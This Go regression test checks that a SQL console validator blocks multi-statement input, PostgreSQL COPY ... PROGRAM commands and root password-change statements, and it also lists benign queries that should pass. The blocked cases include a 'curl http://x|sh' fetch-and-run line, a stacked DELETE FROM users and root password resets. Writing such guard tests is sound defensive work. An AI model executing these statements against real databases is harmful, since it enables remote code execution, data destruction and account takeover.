package database

import "testing"

// 回归：SQL 控制台守卫——多语句、COPY PROGRAM、改密变体此前可绕过。
func TestValidateSQL_Guards(t *testing.T) {
	blocked := []struct{ name, sql string }{
		{"多语句", "SELECT 1; DELETE FROM users"},
		{"多语句(无WHERE)", "SELECT 1; DELETE FROM users;"},
		{"PG COPY PROGRAM", "COPY (SELECT 1) TO PROGRAM 'curl http://x|sh'"},
		{"PG COPY FROM PROGRAM", "COPY t FROM PROGRAM 'id'"},
		{"MySQL8 改密变体", "ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'x'"},
		{"SET PASSWORD", "SET PASSWORD FOR 'root'@'localhost' = 'x'"},
	}
	for _, tc := range blocked {
		if r := ValidateSQL(tc.sql); r.Valid {
			t.Errorf("%s: expected blocked, got valid", tc.name)
		}
	}

	allowed := []struct{ name, sql string }{
		{"单条查询", "SELECT * FROM users WHERE id = 1"},
		{"末尾分号", "SELECT 1;"},
		{"字符串内分号", "SELECT ';'"},
		{"字符串内分号加语句", "SELECT 'a;b' FROM t WHERE id = 1"},
		{"反引号内分号", "SELECT `a;b` FROM t WHERE id = 1"},
		{"无WHERE的删除(首语句黑名单)", "SELECT 'x'"},
	}
	for _, tc := range allowed {
		if r := ValidateSQL(tc.sql); !r.Valid {
			t.Errorf("%s: expected valid, got blocked: %s", tc.name, r.Message)
		}
	}
}
